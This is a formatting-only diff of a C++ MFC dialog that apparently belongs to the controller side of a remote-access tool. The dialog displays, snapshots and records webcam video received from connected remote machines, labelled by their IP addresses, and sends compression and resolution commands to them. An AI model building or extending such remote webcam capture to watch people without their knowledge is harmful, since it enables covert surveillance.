@@ -28,21 +28,21 @@ CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *p
 	//{{AFX_DATA_INIT(CWebCamDlg)
 		// NOTE: the ClassWizard will add member initialization here
 	//}}AFX_DATA_INIT
-	m_iocpServer	= pIOCPServer;
-	m_pContext		= pContext;
-	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
-	m_nCount		= 0;
-	m_lpbmi			= NULL;
-	m_lpScreenDIB	= NULL;
-	m_lpCompressDIB	= NULL;
-	m_pVideoCodec	= NULL;
+	m_iocpServer = pIOCPServer;
+	m_pContext = pContext;
+	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
+	m_nCount = 0;
+	m_lpbmi = NULL;
+	m_lpScreenDIB = NULL;
+	m_lpCompressDIB = NULL;
+	m_pVideoCodec = NULL;
 
 	sockaddr_in  sockAddr;
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
 	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
-	
+
 	m_nOldWidth = 0;
 	m_nCount = 0;
 
@@ -68,12 +68,12 @@ BEGIN_MESSAGE_MAP(CWebCamDlg, CDialogEx)
 	ON_WM_SHOWWINDOW()
 	ON_WM_SIZE()
 	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
-		
-	ON_COMMAND(IDM_ENABLECOMPRESS,OnEnableCompress)
-	ON_COMMAND(IDM_SAVECAMDIB,OnSaveCamDib)
-	ON_COMMAND(IDM_SAVEAVI,OnSaveAvi)
-	ON_COMMAND(IDM_SIZE_176_144,OnSize176)
-	ON_COMMAND(IDM_SIZE_352_288,OnSize352)
+
+	ON_COMMAND(IDM_ENABLECOMPRESS, OnEnableCompress)
+	ON_COMMAND(IDM_SAVECAMDIB, OnSaveCamDib)
+	ON_COMMAND(IDM_SAVEAVI, OnSaveAvi)
+	ON_COMMAND(IDM_SIZE_176_144, OnSize176)
+	ON_COMMAND(IDM_SIZE_352_288, OnSize352)
 	//}}AFX_MSG_MAP
 END_MESSAGE_MAP()
 
@@ -85,7 +85,7 @@ void CWebCamDlg::OnReceive()
 	CString str;
 	str.Format(_T("\\\\%s %d * %d 第%d帧 %d%%"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
 		m_nCount, m_pContext->m_nTransferProgress);
-	SetWindowText(str);	
+	SetWindowText(str);
 }
 
 void CWebCamDlg::OnReceiveComplete()
@@ -110,34 +110,34 @@ bool CWebCamDlg::SaveSnapshot()
 {
 	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
 	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
-	if(dlg.DoModal () != IDOK)
+	if (dlg.DoModal() != IDOK)
 		return false;
 
 	BITMAPFILEHEADER	hdr;
 	LPBITMAPINFO		lpbi = m_lpbmi;
 	CFile	file;
-	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
+	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
 	{
 		MessageBox(_T("文件保存失败"));
 		return false;
 	}
-	
+
 	// BITMAPINFO大小
 	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
-	
+
 	// Fill in the fields of the file header
-	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
-	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
-	hdr.bfReserved1 	= 0;
-	hdr.bfReserved2 	= 0;
-	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
+	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
+	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
+	hdr.bfReserved1 = 0;
+	hdr.bfReserved2 = 0;
+	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
 	// Write the file header
 	file.Write(&hdr, sizeof(hdr));
 	file.Write(lpbi, nbmiSize);
 	// Write the DIB header and the bits
 	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
 	file.Close();
-	
+
 	return true;
 }
 
@@ -156,13 +156,13 @@ void CWebCamDlg::SaveAvi()
 
 	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
 	CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("视频文件(*.avi)|*.avi|"), this);
-	if(dlg.DoModal () != IDOK)
+	if (dlg.DoModal() != IDOK)
 		return;
 	m_aviFile = dlg.GetPathName();
 	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
 	{
 		m_aviFile = "";
-		MessageBox(_T("创建录像文件失败"));	
+		MessageBox(_T("创建录像文件失败"));
 	}
 	else
 	{
@@ -176,7 +176,7 @@ void CWebCamDlg::SendException()
 	m_iocpServer->Send(m_pContext, &bBuff, 1);
 }
 
-BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
+BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg)
 {
 	// TODO: Add your specialized code here and/or call the base class
 	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
@@ -187,11 +187,11 @@ BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg)
 }
 
 LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
-{	
+{
 	// 如果m_MMI已经被赋值
 	if (m_MMI.ptMaxSize.x > 0)
 		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
-	
+
 	return NULL;
 }
 
@@ -203,7 +203,7 @@ void CWebCamDlg::InitMMI()
 	ClientToScreen(&rectClient);
 	// 边框的宽度
 	int	nBorderWidth = rectClient.left - rectWindow.left;
-	
+
 	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
 	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;
 
@@ -227,14 +227,14 @@ void CWebCamDlg::InitMMI()
 	// 窗口最大尺寸
 	m_MMI.ptMaxSize.x = nMaxWidth;
 	m_MMI.ptMaxSize.y = nMaxHeight;
-	
+
 	// 最大的Track尺寸也要改变
 	m_MMI.ptMaxTrackSize.x = nMaxWidth;
 	m_MMI.ptMaxTrackSize.y = nMaxHeight;
 
 }
 
-void CWebCamDlg::OnClose() 
+void CWebCamDlg::OnClose()
 {
 	// TODO: Add your message handler code here and/or call default
 	// 销毁时移除自己在视图中的数据
@@ -249,24 +249,24 @@ void CWebCamDlg::OnClose()
 
 	m_pContext->m_Dialog[0] = 0;
 	closesocket(m_pContext->m_Socket);
-	
-	if (m_lpbmi) 
-		delete [] m_lpbmi;
+
+	if (m_lpbmi)
+		delete[] m_lpbmi;
 	if (m_lpScreenDIB)
-		delete [] m_lpScreenDIB;
+		delete[] m_lpScreenDIB;
 	if (m_lpCompressDIB)
-		delete [] m_lpCompressDIB;
+		delete[] m_lpCompressDIB;
 	if (m_pVideoCodec)
 		delete m_pVideoCodec;
 
 	CDialogEx::OnClose();
-//	DestroyWindow();
+	//	DestroyWindow();
 }
 
-BOOL CWebCamDlg::OnInitDialog() 
+BOOL CWebCamDlg::OnInitDialog()
 {
 	CDialogEx::OnInitDialog();
-	
+
 	// TODO: Add extra initialization here
 	SetIcon(m_hIcon, TRUE);			// Set big icon
 	SetIcon(m_hIcon, FALSE);		// Set small icon
@@ -277,7 +277,7 @@ BOOL CWebCamDlg::OnInitDialog()
 		pSysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, _T("视频压缩(&C)"));
 		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
 		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("保存录像(&V)"));
-		pSysMenu->AppendMenu(MF_SEPARATOR);	
+		pSysMenu->AppendMenu(MF_SEPARATOR);
 		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_176_144, _T("176 * 144"));
 		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_352_288, _T("352 * 288"));
 
@@ -316,16 +316,16 @@ void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	switch (nID)
 	{
 	case IDM_ENABLECOMPRESS:
-		{
-			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
-			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
-			bIsChecked = !bIsChecked;
-			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
-			if (!bIsChecked)
-				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
-			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
-		}
-		break;
+	{
+		bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
+		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
+		bIsChecked = !bIsChecked;
+		BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
+		if (!bIsChecked)
+			bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
+		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+	}
+	break;
 	case IDM_SAVEDIB:
 		SaveSnapshot();
 		break;
@@ -333,17 +333,17 @@ void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		SaveAvi();
 		break;
 	case IDM_SIZE_176_144:
-		{
-			if (SendResetScreen(176, 144))
-				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
-		}
-		break;
+	{
+		if (SendResetScreen(176, 144))
+			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
+	}
+	break;
 	case IDM_SIZE_352_288:
-		{
-			if (SendResetScreen(352, 288))
-				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
-		}
-		break;
+	{
+		if (SendResetScreen(352, 288))
+			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
+	}
+	break;
 	default:
 		CDialogEx::OnSysCommand(nID, lParam);
 	}
@@ -382,8 +382,8 @@ void CWebCamDlg::DrawDIB()
 		{
 			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
 			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
-			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
-				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
+			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen,
+				(LPBYTE)m_lpScreenDIB, NULL, NULL);
 		}
 	}
 	OnPaint();
@@ -404,7 +404,7 @@ void CWebCamDlg::InitCodec(DWORD fccHandler)
 		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
 		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
-	}	
+	}
 }
 
 bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
@@ -448,18 +448,18 @@ void CWebCamDlg::ResetScreen()
 	}
 
 	int	nBmiSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
-	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
+	m_lpbmi = (LPBITMAPINFO) new BYTE[nBmiSize];
 	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);
 
-	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
-	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
-	
+	m_lpScreenDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];
+	m_lpCompressDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];
+
 	memset(&m_MMI, 0, sizeof(MINMAXINFO));
 	if (IsWindowVisible())
 		InitMMI();
 }
 
-void CWebCamDlg::OnPaint() 
+void CWebCamDlg::OnPaint()
 {
 	// device context for painting
 	CPaintDC dc(this);	//Unused, reason unknown
@@ -469,17 +469,17 @@ void CWebCamDlg::OnPaint()
 
 	//StretchDIBits 不好用，有些时候会画不出来
 	DrawDibDraw
-		(
-		m_hDD, 
+	(
+		m_hDD,
 		m_hDC,
 		0, 0,
 		rect.right, rect.bottom,
 		(LPBITMAPINFOHEADER)m_lpbmi,
 		m_lpScreenDIB,
 		0, 0,
-		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
+		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
 		DDF_SAME_HDC
-		);
+	);
 
 	LPCTSTR	lpTipsString = _T("Recording ...");
 	// 写入录像文件
@@ -488,22 +488,22 @@ void CWebCamDlg::OnPaint()
 		m_aviStream.Write(m_lpScreenDIB);
 		// 提示正在录像
 		SetBkMode(m_hDC, TRANSPARENT);
-		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
+		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
 		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
 	}
 
 	// Do not call CDialog::OnPaint() for painting messages
 }
 
-void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
+void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus)
 {
 	CDialogEx::OnShowWindow(bShow, nStatus);
-	
+
 	// TODO: Add your message handler code here
-	
+
 }
 
-void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
+void CWebCamDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType, cx, cy);
 	if (!IsWindowVisible())
@@ -516,29 +516,29 @@ void CWebCamDlg::OnSize(UINT nType, int cx, int cy)
 	GetWindowRect(&rectWindow);
 	GetClientRect(&rectClient);
 	GetClientRect(&rectClientToScreen);
-	ClientToScreen(&rectClientToScreen);  
+	ClientToScreen(&rectClientToScreen);
 	// 边框的宽度
 	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;
 
 	int	nWindowWidth = rectWindow.right - rectWindow.left;
 	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
-	
+
 	// 宽发生变化
 	if (m_nOldWidth != nWindowWidth)
 		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
 	else
 		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;
-	   
+
 	m_nOldWidth = nWindowWidth;
 
 	MoveWindow(&rectWindow);
-	
+
 	OnPaint();
 	// TODO: Add your message handler code here
-	
+
 }
 
-void CWebCamDlg::PostNcDestroy() 
+void CWebCamDlg::PostNcDestroy()
 {
 	// TODO: Add your specialized code here and/or call the base class
 	delete this;
@@ -547,16 +547,15 @@ void CWebCamDlg::PostNcDestroy()
 
 void CWebCamDlg::OnEnableCompress()
 {
-	BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
-//	if (!bIsChecked)
-	bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
+	//	if (!bIsChecked)
+	BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 }
 void CWebCamDlg::OnSaveCamDib()
 {
 	SaveSnapshot();
 }
-			
+
 void CWebCamDlg::OnSaveAvi()
 {
 	SaveAvi();
